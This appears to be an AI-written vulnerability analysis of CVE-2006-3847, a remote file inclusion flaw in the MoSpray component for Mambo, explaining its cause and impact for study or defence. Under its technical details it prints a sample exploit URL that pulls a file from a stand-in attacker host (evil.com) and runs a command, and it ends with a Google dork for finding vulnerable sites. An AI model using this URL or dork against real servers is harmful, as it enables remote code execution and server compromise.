Based on the provided information, here's an analysis of CVE-2006-3847:

**Root Cause of Vulnerability:**

*   The vulnerability is a **Remote File Inclusion (RFI)** flaw.
*   The `basedir` parameter in the `admin.php` script (and potentially others like `details.php`, `modify.php`, `newgroup.php`, `newtask.php`, `rss.php`) of the Mambo Component MoSpray does not properly sanitize user input. This allows an attacker to control the path of the included file.

**Weaknesses/Vulnerabilities Present:**

*   **Remote File Inclusion (RFI):** The application directly includes a file whose path is controlled by user-supplied input. This is a classic RFI vulnerability.
*   Lack of Input Sanitization: The `basedir` parameter is not validated or sanitized, enabling the inclusion of arbitrary remote files.

**Impact of Exploitation:**

*   **Arbitrary Code Execution:** By including a malicious file from a remote server, an attacker can execute arbitrary code on the vulnerable server. This can lead to:
    *   Full compromise of the server.
    *   Data theft and manipulation.
    *   Installation of malware.
    *   Defacement of the website.

**Attack Vectors:**

*   **HTTP GET Request:** The vulnerability is exploited through a specially crafted HTTP GET request targeting the vulnerable `admin.php` script and other files, using the `basedir` parameter to specify the remote malicious file.

**Required Attacker Capabilities/Position:**

*   **Network Access:** The attacker needs to have network access to the vulnerable server.
*   **Ability to Host Malicious File:** The attacker needs to have a server to host the malicious file they wish to include.
*   **Understanding of RFI Exploitation:** The attacker needs to know how to exploit RFI vulnerabilities, including crafting the malicious request.

**Technical Details:**

*   The vulnerability exists in the following code snippet:
    ```php
    require("$basedir/components/com_mospray/lang/$lang/admin.php");
    ```
*   The attacker can manipulate the `basedir` parameter in the URL, for example:
    ```
    http://www.site.com/components/com_mospray/scripts/admin.php?basedir=http://evil.com/evil.txt?&cmd=id
    ```
    In this example, `http://evil.com/evil.txt` represents a file controlled by the attacker, and the application will attempt to include and execute this file.

**Additional Information:**

*   The exploit was first published on July 23, 2006.
*   A Google dork for identifying vulnerable sites is provided: `allinurl:"com_mospray"`
